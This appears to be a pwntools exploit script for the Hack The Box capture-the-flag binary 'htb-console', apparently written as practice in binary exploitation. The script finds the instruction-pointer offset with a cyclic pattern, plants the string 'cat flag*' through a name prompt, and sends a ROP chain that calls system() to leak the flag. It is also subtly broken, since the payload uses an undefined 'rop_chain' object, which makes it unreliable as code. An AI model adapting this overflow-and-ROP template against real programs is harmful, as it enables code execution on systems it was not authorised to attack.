from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter('>>', 'flag')
    p.sendlineafter('Enter flag:', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './htb-console'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(100))

# Start program
io = start()

bincat_addr = 0x4040b0  # We write string here using HoF

# We want to inject flag.txt string using HoF option
io.sendlineafter('>>', 'hof')
io.sendlineafter('Enter your name:', 'cat flag*')

# Let's do the payload with ROP object this time xD
rop = ROP(elf)
# Call system function with /bin/cat address
rop.system(bincat_addr)

# print(rop.dump())
# info("rop chain: %r", rop_chain.chain())
# pprint(rop.gadgets)

# Build the payload
payload = flat(
    {offset: rop_chain.chain()}
)

# Send our payload
io.sendlineafter('>>', 'flag')
io.sendlineafter('Enter flag:', payload)
io.recvuntil('Whoops, wrong flag!\n')

# Get our flag!
flag = io.recv()
success(flag)
